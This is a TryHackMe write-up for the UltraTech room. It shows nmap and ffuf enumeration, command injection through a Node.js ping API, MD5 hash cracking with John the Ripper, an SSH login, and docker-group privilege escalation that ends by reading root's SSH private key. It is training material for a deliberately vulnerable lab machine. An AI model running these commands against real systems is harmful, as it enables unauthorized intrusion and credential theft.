---
layout: post
title: UltraTech
subtitle: TryHackMe Writeup - UltraTech
description: A step-by-step guide to rooting the UltraTech machine on TryHackMe, inspired by Mr. Robot.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/e0f6687c43305e3b67a6cb38951d7b56.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/e0f6687c43305e3b67a6cb38951d7b56.png
category: tryhackme
tags:
  - TryHackMe
  - commandinjection
  - JohnTheRipper
  - ffuf
  - ssh
  - docker_privilegeEscalation
author: Mustafa Altayeb
date: 2025-11-05 00:00
paginate: true
---
# UltraTech - TryHackMe Writeup

[UltraTech](https://tryhackme.com/room/ultratech1)

---

## Objectives
1. Enumerate services
2. Web Enumeration
3. Brute Force with ffuf
4. Gain credential via command injection
5. Crack hashes with john
6. Gain access via ssh
7. Privilege escalation using docker

---

# Reconnaissance

## Nmap Scan
> **nmap -p- -sCV -T4 10.10.157.117**

**Results:**
```plaintext
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.5
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 65:4d:0c:da:d5:73:90:49:73:34:c1:00:ed:36:1e:2b (RSA)
|   256 1e:c5:9f:db:29:60:85:08:36:11:0c:92:c9:f5:cc:e0 (ECDSA)
|_  256 96:e5:e2:51:50:45:f6:e6:fb:a3:fc:ab:49:25:d3:1c (ED25519)
8081/tcp open  http     Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Findings:**
- **Port 21**: Running FTP version `vsftpd 3.0.5`
- **Port 22**: Running SSH version `8.2p1`
- **Port 8081**: Running HTTP Node.js server
- **Port 31331**: Running HTTP Ubuntu Apache server version `2.4.41`

## Web Enumeration
**Access Node.js server**: Found a page with UltraTech API v0.1.3.

![]( /assets/TryHackMeRoomsImage/UltraTech/1.png )

**Access Apache server**: Normal website with nothing interesting.

![]( /assets/TryHackMeRoomsImage/UltraTech/2.png )

## Brute Force Using ffuf
**Brute force Apache server to find hidden directories:**
> **ffuf -w /usr/share/wordlists/rockyou.txt -u http://10.10.157.117:31331/FUZZ -fw 393**

**Result:**
```plaintext
/index.html
/robots.txt
/.htaccess (403)
/css
/js
/images
```

In `/js`, found `api.js` with this source code:

![]( /assets/TryHackMeRoomsImage/UltraTech/3.png )

This code executes a command from the Node.js server to get the hostname—it's a command injection vulnerability:
`http://10.10.157.117:8081/ping?ip=${window.location.hostname}`

Trying to execute commands:

**whoami**:

![]( /assets/TryHackMeRoomsImage/UltraTech/4.png )

It returns "www". Trying another one:

**ls**:

![]( /assets/TryHackMeRoomsImage/UltraTech/5.png )

Lists a file called `utech.db.sqlite` (database file). Trying to cat it:

![]( /assets/TryHackMeRoomsImage/UltraTech/6.png )

It contains 2 users: "r00t" and "admin", along with their password hashes.

## Cracking the Hash Using John the Ripper
> **john --pot=./temp.pot --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash**

**Result:**
```plaintext
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
n100906 (?)
1g 0:00:00:00 DONE
```

---

## Gain Access to System Using SSH
> **ssh r00t@10.10.157.117**

```plaintext
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
r00t@ip-10-10-157-117:~$ whoami
r00t
```

We are `r00t` (not root), but we are in the docker group—that's all we need.

---

# Privilege Escalation
```plaintext
r00t@ip-10-10-157-117:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

With `docker` group access, we can mount the full host filesystem and chroot into it as root:
> **docker run -v /:/mnt --rm -it bash chroot /mnt sh**

```plaintext
r00t@ip-10-10-157-117:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
```

## Get Root SSH Key
```plaintext
# cat /root/.ssh/id_rsa
```

Finished. Happy Hacking!

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>

Follow me:
- [LinkedIn](https://www.linkedin.com/in/t4t4r1s/)
- [X](https://x.com/T4T4R1S)